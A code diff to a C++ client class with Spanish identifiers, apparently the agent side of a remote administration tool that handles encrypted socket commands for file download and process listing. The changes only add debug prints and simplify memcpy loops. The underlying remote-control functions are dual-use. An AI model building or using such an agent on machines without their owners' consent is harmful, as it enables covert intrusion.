@@ -142,6 +142,8 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         return;
     }
 
+    DebugPrint(pBuffer);
+
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo_Recibir){
         // CMD + 1, resto son bytes
         int iHeaderSize = std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir).size() + 1;
@@ -336,6 +338,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     //#        COMANDOS SUBMENU ADMIN PROCESOS            #
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::PM_Refrescar) {
+        DebugPrint("Enviando procesos");
         std::string strProc = std::to_string(EnumComandos::PM_Lista);
         strProc.append(1, CMD_DEL);
         strProc += strProcessList();
@@ -609,9 +612,10 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
     ByteArray cData = this->bEnc((const unsigned char*)pBuffer, pLen);
     int iDataSize = cData.size();
     char* newBuffer = new char[iDataSize];
-    for (int iBytePos = 0; iBytePos < iDataSize; iBytePos++) {
-        std::memcpy(newBuffer + iBytePos, &cData[iBytePos], 1);
-    }
+    std::memcpy(newBuffer, cData.data(), iDataSize);
+    //for (int iBytePos = 0; iBytePos < iDataSize; iBytePos++) {
+    //    std::memcpy(newBuffer + iBytePos, &cData[iBytePos], 1);
+    //}
     int iEnviado = 0;
     if (isBlock) {
 
@@ -654,6 +658,7 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
     int iRecibido = 0;
     if (isBlock) {
         //Hacer el socket block
+
         unsigned long int iBlock = 0;
         if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
             DebugPrint("No se pudo hacer block");
@@ -673,9 +678,10 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
         ByteArray bOut = this->bDec((const unsigned char*)cTmpBuff, iRecibido);
 
         iRecibido = bOut.size();
-        for (int iBytePos = 0; iBytePos < iRecibido; iBytePos++) {
-            std::memcpy(pBuffer + iBytePos, &bOut[iBytePos], 1);
-        }
+        std::memcpy(pBuffer, bOut.data(), bOut.size());
+        //for (int iBytePos = 0; iBytePos < iRecibido; iBytePos++) {
+        //    std::memcpy(pBuffer + iBytePos, &bOut[iBytePos], 1);
+        //}
 
         //Restaurar
         if (!this->BLOCK_MODE) {
